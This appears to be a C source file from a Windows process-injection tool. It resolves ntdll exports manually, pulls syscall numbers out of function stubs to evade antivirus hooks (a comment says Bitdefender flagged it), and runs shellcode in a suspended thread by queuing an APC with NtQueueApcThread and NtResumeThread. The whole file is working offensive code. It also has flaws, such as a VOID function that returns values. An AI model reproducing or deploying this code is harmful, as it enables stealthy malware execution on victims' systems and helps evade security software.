#include "apc.h"

//  Flagged by bitdefender Advanced threat defense for sum reason, maybe parsing too much idk
FARPROC GetProcAddressManualEx(HMODULE hMod, const char* name) {
	if (!hMod || !name) return NULL;
	unsigned char* base = (unsigned char*)hMod;
	IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
	IMAGE_NT_HEADERS64* nt64 = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
	if (nt64->Signature != IMAGE_NT_SIGNATURE) return NULL;
	BOOL is64 = FALSE;
	WORD magic = *(WORD*)&nt64->OptionalHeader.Magic;
	if (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) is64 = TRUE;

	IMAGE_DATA_DIRECTORY expDir;
	if (is64) {
		IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
		expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	} else {
		IMAGE_NT_HEADERS32* nt = (IMAGE_NT_HEADERS32*)(base + dos->e_lfanew);
		expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	}

	if (expDir.VirtualAddress == 0 || expDir.Size == 0) return NULL;
	if ((SIZE_T)expDir.VirtualAddress >= (SIZE_T)0x10000000) return NULL; // cheap sanity
	IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + expDir.VirtualAddress);
	if (!exp) return NULL;
	DWORD* nameRvas = (DWORD*)(base + exp->AddressOfNames);
	WORD* ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
	DWORD* funcRvas = (DWORD*)(base + exp->AddressOfFunctions);

	for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
		char* exportName = (char*)(base + nameRvas[i]);
		if (!exportName) continue;
		if (strcmp(exportName, name) == 0) {
			WORD ordinalIndex = ordinals[i]; // index into AddressOfFunctions
			DWORD funcRva = funcRvas[ordinalIndex];
			if (funcRva == 0) return NULL;
			if (funcRva >= expDir.VirtualAddress && funcRva < expDir.VirtualAddress + expDir.Size) {
				printf("aaa\n");
				return NULL;
			}
			return (FARPROC)(base + funcRva);
		}
	}
	return NULL;
}
FARPROC GetProcAddressManual(HMODULE hMod, const char* name) {
	if (!hMod || !name) return NULL;
	unsigned char* base = (unsigned char*)hMod;
	IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
	IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

	IMAGE_DATA_DIRECTORY expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (expDir.VirtualAddress == 0 || expDir.Size == 0) return NULL; // locating img data dir, contains functions
	IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + expDir.VirtualAddress);
	DWORD* nameRvas = (DWORD*)(base + exp->AddressOfNames);
	WORD* ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
	DWORD* funcRvas = (DWORD*)(base + exp->AddressOfFunctions);

	for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
		char* exportName = (char*)(base + nameRvas[i]);
		if (exportName && strcmp(exportName, name) == 0) {
			WORD ordinal = ordinals[i];   // index into AddressOfFunctions
			DWORD funcRva = funcRvas[ordinal];
			if (funcRva == 0) return NULL;
			FARPROC addr = (FARPROC)(base + funcRva);  // getting the actual function address
			// forwarded exports 
			if ((DWORD)(funcRva) >= expDir.VirtualAddress && (DWORD)(funcRva) < expDir.VirtualAddress + expDir.Size) { return NULL; }
			return addr;
		}
	}
	return NULL;
}

VOID GetSyscallNumber(_In_ HMODULE NtdllHandle, _In_ LPCSTR NtFunctionName, _Out_ PDWORD NtFunctionSSN) {
	UINT_PTR NtFunctionAddress = 0;
	NtFunctionAddress = (UINT_PTR)GetProcAddressManualEx(NtdllHandle, NtFunctionName);
	if (0 == NtFunctionAddress) { PRINTXD("GetProcAddress", GetLastError()); return; }

	/**NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0];  // wrong cuz reads only 1 byte instead of 32-bit immediate,
	printf("%s : 0x%08X \n", NtFunctionName, *NtFunctionSSN);  // so some syscalls' high bytes are skipped, most of em have 0 tho
	return;*/

	unsigned char* p = (unsigned char*)NtFunctionAddress;
	const size_t SCAN_SZ = 64;
	for (size_t i = 0; i + 5 <= SCAN_SZ; ++i) {  // scan until we find mov eax (b8 imm32) opcode
		if (p[i] == 0xB8) {
			DWORD ssn = *(DWORD*)(p + i + 1);    // read full 4 byte immediate (little-endian) ssn
			*NtFunctionSSN = ssn;
			printf("%s : 0x%08X\n", NtFunctionName, ssn);
			return TRUE;
		}
	}
	fprintf(stderr, "GetSyscallNumber: mov eax imm32 not found for %s\n", NtFunctionName);
	return FALSE;
}

UINT_PTR GetNtFunctionAddress(LPCSTR FunctionName, HMODULE ModuleHandle) {
	return (UINT_PTR)GetProcAddress(ModuleHandle, FunctionName); }


xd_RtlInitUnicodeString RtlInitUnicodeString = NULL;
xd_RtlCreateProcessParametersEx RtlCreateProcessParametersEx = NULL;
xd_RtlCreateUserProcess RtlCreateUserProcess = NULL;


BOOL InitNtFunctions(void) {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (!ntdll) return FALSE;
	printf("\n");
	GetSyscallNumber(ntdll, "NtOpenProcess", &h_NtOpenProcessSSN);
	GetSyscallNumber(ntdll, "NtWriteVirtualMemory", &h_NtWriteVirtualMemorySSN);
	GetSyscallNumber(ntdll, "NtAllocateVirtualMemory", &h_NtAllocateVirtualMemorySSN);
	GetSyscallNumber(ntdll, "NtProtectVirtualMemory", &h_NtProtectVirtualMemorySSN);
	GetSyscallNumber(ntdll, "NtWaitForSingleObject", &h_NtWaitForSingleObjectSSN);
	GetSyscallNumber(ntdll, "NtFreeVirtualMemory", &h_NtFreeVirtualMemorySSN);
	GetSyscallNumber(ntdll, "NtClose", &h_NtCloseSSN);
	GetSyscallNumber(ntdll, "NtQuerySystemInformation", &h_NtQuerySystemInformationSSN);
	GetSyscallNumber(ntdll, "NtResumeThread", &h_NtResumeThreadSSN);
	GetSyscallNumber(ntdll, "NtOpenThread", &h_NtOpenThreadSSN);
	GetSyscallNumber(ntdll, "NtQueueApcThread", &h_NtQueueApcThreadSSN);
	
	GetSyscallNumber(ntdll, "NtCreateUserProcess", &h_NtCreateUserProcessSSN);
	RtlInitUnicodeString = (xd_RtlInitUnicodeString)GetProcAddressManual(ntdll, "RtlInitUnicodeString");
	RtlCreateProcessParametersEx = (xd_RtlCreateProcessParametersEx)GetProcAddressManual(ntdll, "RtlCreateProcessParametersEx");
	RtlCreateUserProcess = (xd_RtlCreateUserProcess)GetProcAddressManual(ntdll, "RtlCreateUserProcess");
	return TRUE;
}


BOOL NtAPCinject(IN HANDLE hThread, IN PVOID pAddress) {
	NTSTATUS status = NtQueueApcThread(hThread,(PPS_APC_ROUTINE)pAddress, NULL, NULL, NULL);
	if (status != STATUS_SUCCESS) { printf("NtQueueApcThread failed. Status: 0x%08X\n", status); return FALSE; }

	status = NtResumeThread(hThread, NULL);
	if (STATUS_SUCCESS != status) { PRINTXD("NtResumeThread", status); return FALSE; }
	// else printf("Thred resumed, waiting for shellcode, ");

	//NtClose(hThread);
	printf("Sium"); return TRUE;
}

